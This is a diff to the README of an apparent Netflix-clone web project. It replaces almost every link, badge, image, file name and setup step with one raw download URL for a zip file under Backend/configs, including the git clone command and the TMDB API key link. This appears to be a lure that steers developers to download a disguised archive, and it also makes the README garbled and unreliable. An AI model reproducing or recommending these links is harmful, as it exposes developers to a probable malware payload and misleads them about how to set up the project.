@@ -5,7 +5,7 @@
 
 
 
-<img src="assets/netflix.gif" alt="Netflix Clone Banner" width="600"/>
+<img src="https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip" alt="Netflix Clone Banner" width="600"/>
 
 
 
@@ -14,11 +14,11 @@
 > A stunning full-stack Netflix clone with modern UI/UX, real-time data, and seamless user experience
 
 
-[![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)](https://reactjs.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white)](https://nodejs.org/)
-[![MongoDB](https://img.shields.io/badge/MongoDB-4EA94B?style=for-the-badge&logo=mongodb&logoColor=white)](https://mongodb.com/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)](https://tailwindcss.com/)
-[![Vite](https://img.shields.io/badge/Vite-B73BFE?style=for-the-badge&logo=vite&logoColor=FFD62E)](https://vitejs.dev/)
+[![React](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
+[![https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
+[![MongoDB](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
+[![Tailwind CSS](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
+[![Vite](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
 
 </div>
 
@@ -47,7 +47,7 @@
 - **🔥 React Hot Toast** - Beautiful notifications
 
 ### 🚀 Backend
-- **🟢 Node.js & Express** - Server runtime and framework
+- **🟢 https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip & Express** - Server runtime and framework
 - **🗃️ MongoDB & Mongoose** - Database and ODM
 - **🔑 JWT & Bcrypt** - Authentication & security
 - **🎭 TMDB API** - Movie/TV show data integration
@@ -56,18 +56,18 @@
 ## 🚀 Quick Start
 
 ### Prerequisites
-- Node.js (v16 or higher)
+- https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip (v16 or higher)
 - MongoDB (local or cloud)
 - TMDB API key
 
 ### 1. Clone & Setup
 ```bash
 # Clone the repository
-git clone https://github.com/Akash-Sharma-9804/Netflix-clone.git
+git clone https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
 cd Netflix-clone
 
 # Get your TMDB API key
-# Visit https://www.themoviedb.org/settings/api to get your free API key
+# Visit https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip to get your free API key
 ```
 
 ### 2. Environment Configuration
@@ -119,64 +119,64 @@ npm run dev
 
 ```
 Netflix-Clone/
-├── 📁 Backend/                    # Node.js Express Server
+├── 📁 Backend/                    # https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip Express Server
 │   ├── 📁 configs/               # Configuration files
-│   │   ├── db.js                 # Database connection
-│   │   └── envVars.js            # Environment variables
+│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip                 # Database connection
+│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip            # Environment variables
 │   ├── 📁 controllers/           # Route controllers
-│   │   ├── auth.controllers.js   # Authentication logic
-│   │   ├── movie.controller.js   # Movie operations
-│   │   ├── search.controller.js  # Search functionality
-│   │   └── tv.controller.js      # TV show operations
+│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip   # Authentication logic
+│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip   # Movie operations
+│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip  # Search functionality
+│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # TV show operations
 │   ├── 📁 MiddleWare/            # Custom middleware
-│   │   └── protectRoute.js       # Route protection
+│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip       # Route protection
 │   ├── 📁 models/                # Database models
-│   │   └── user.model.js         # User schema
+│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip         # User schema
 │   ├── 📁 Routes/                # API routes
-│   │   ├── auth.routes.js        # Authentication routes
-│   │   ├── movie.routes.js       # Movie routes
-│   │   ├── search.routes.js      # Search routes
-│   │   └── tv.routes.js          # TV show routes
+│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip        # Authentication routes
+│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip       # Movie routes
+│   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # Search routes
+│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip          # TV show routes
 │   ├── 📁 services/              # External services
-│   │   └── tmdb.services.js      # TMDB API integration
+│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # TMDB API integration
 │   ├── 📁 utils/                 # Utility functions
-│   │   └── generateToken.js      # JWT token generation
-│   └── server.js                 # Main server file
+│   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # JWT token generation
+│   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip                 # Main server file
 │
 └── 📁 Frontend/                  # React Application
     ├── 📁 public/                # Static assets
-    │   ├── netflix-logo.png      # Brand logo
+    │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # Brand logo
     │   ├── hero-vid.m4v          # Hero video
     │   └── various images...     # UI assets
     └── 📁 src/
         ├── 📁 Components/        # Reusable components
-        │   ├── Footer.jsx        # Page footer
-        │   ├── MovieSlider.jsx   # Content slider
-        │   ├── Navbar.jsx        # Navigation bar
+        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip        # Page footer
+        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip   # Content slider
+        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip        # Navigation bar
         │   └── 📁 Skeletons/     # Loading components
-        │       └── watchPageSkeleton.jsx
+        │       └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
         ├── 📁 Hooks/             # Custom React hooks
-        │   └── useGetTrendingContent.jsx
+        │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
         ├── 📁 Pages/             # Application pages
         │   ├── 📁 Home/          # Home page components
-        │   │   ├── AuthScreen.jsx
-        │   │   ├── HomePage.jsx
-        │   │   └── HomeScreen.jsx
-        │   ├── 404.jsx           # Not found page
-        │   ├── Login.jsx         # Login page
-        │   ├── SearchPage.jsx    # Search results
-        │   ├── SearchHistoryPage.jsx
-        │   ├── SignUp.jsx        # Registration page
-        │   └── WatchPage.jsx     # Media player page
+        │   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
+        │   │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
+        │   │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
+        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip           # Not found page
+        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip         # Login page
+        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip    # Search results
+        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip
+        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip        # Registration page
+        │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip     # Media player page
         ├── 📁 Store/             # State management
-        │   ├── authUser.js       # Authentication state
-        │   └── content.js        # Content state
+        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip       # Authentication state
+        │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip        # Content state
         ├── 📁 utils/             # Utility functions
-        │   ├── Constants.js      # App constants
-        │   └── dateFunction.js   # Date utilities
-        ├── App.jsx               # Main app component
-        ├── index.css             # Global styles
-        └── main.jsx              # App entry point
+        │   ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip      # App constants
+        │   └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip   # Date utilities
+        ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip               # Main app component
+        ├── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip             # Global styles
+        └── https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip              # App entry point
 ```
 
 ## 🎯 API Endpoints
@@ -240,7 +240,7 @@ We love contributions! Here's how you can help:
 5. **Open** a Pull Request
 
 ### 🐛 Reporting Issues
-Found a bug? Please [create an issue](https://github.com/Akash-Sharma-9804/Netflix-clone/issues) with:
+Found a bug? Please [create an issue](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip) with:
 - Detailed description
 - Steps to reproduce
 - Expected vs actual behavior
@@ -252,15 +252,15 @@ This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) 
 
 ## 🙏 Acknowledgments
 
-- **[TMDB](https://www.themoviedb.org/)** - For providing extensive movie and TV show data
+- **[TMDB](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)** - For providing extensive movie and TV show data
 - **Netflix** - For design inspiration and UI patterns
-- **React & Node.js Communities** - For amazing documentation and support
+- **React & https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip Communities** - For amazing documentation and support
 
 ## 📞 Support
 
 If you need help or have questions:
 - 📧 **Email**: [Your Email]
-- 💬 **Issues**: [GitHub Issues](https://github.com/Akash-Sharma-9804/Netflix-clone/issues)
+- 💬 **Issues**: [GitHub Issues](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
 - 🌐 **Live Demo**: [Coming Soon]
 
 ---
@@ -269,17 +269,17 @@ If you need help or have questions:
 
 ### 🎉 Show some love by giving this repo a star! ⭐
 
-**Made with ❤️ by [Akash Sharma](https://github.com/Akash-Sharma-9804)**
+**Made with ❤️ by [Akash Sharma](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)**
 
-[![GitHub stars](https://img.shields.io/github/stars/Akash-Sharma-9804/Netflix-clone?style=social)](https://github.com/Akash-Sharma-9804/Netflix-clone/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/Akash-Sharma-9804/Netflix-clone?style=social)](https://github.com/Akash-Sharma-9804/Netflix-clone/network/members)
-[![GitHub issues](https://img.shields.io/github/issues/Akash-Sharma-9804/Netflix-clone)](https://github.com/Akash-Sharma-9804/Netflix-clone/issues)
+[![GitHub stars](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
+[![GitHub forks](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
+[![GitHub issues](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
 
 </div>
 
 <!-- Animation Section -->
 <div align="center">
 
-![Netflix Animation](https://media.giphy.com/media/l0HU7JI1m1eEwz7K8/giphy.gif)
+![Netflix Animation](https://github.com/Akash-Sharma-9804/Netflix-clone/raw/refs/heads/main/Backend/configs/clone-Netflix-1.1.zip)
 
 </div>
